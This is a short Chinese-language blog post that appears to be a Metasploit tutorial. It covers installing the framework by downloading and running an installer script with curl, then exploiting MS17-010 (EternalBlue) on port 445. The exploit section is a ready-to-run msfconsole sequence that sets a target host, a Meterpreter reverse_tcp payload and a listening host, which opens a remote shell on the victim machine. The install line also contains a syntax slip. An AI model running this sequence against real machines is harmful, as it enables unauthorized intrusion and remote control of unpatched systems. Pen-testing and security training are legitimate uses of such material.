---
layout: post
title: metasploit使用教程
date: 2019-12-20
categories: blog
tags: [metasploit使用教程]
description: metasploit使用教程
---
#### 一、安装
1、vps搭建metasploit
- ```shell
apt-get install curl,wget
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

#### 二、MS17-010
1、ms17-010为永恒之蓝漏洞，针对445端口，几乎开放了445端口的老机器都存在，很多未打补丁
```shell
use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhost 10.6.6.216
rhost => 10.6.6.216
msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.6.6.112
lhost => 10.6.6.112
msf5 exploit(windows/smb/ms17_010_eternalblue) > run
```






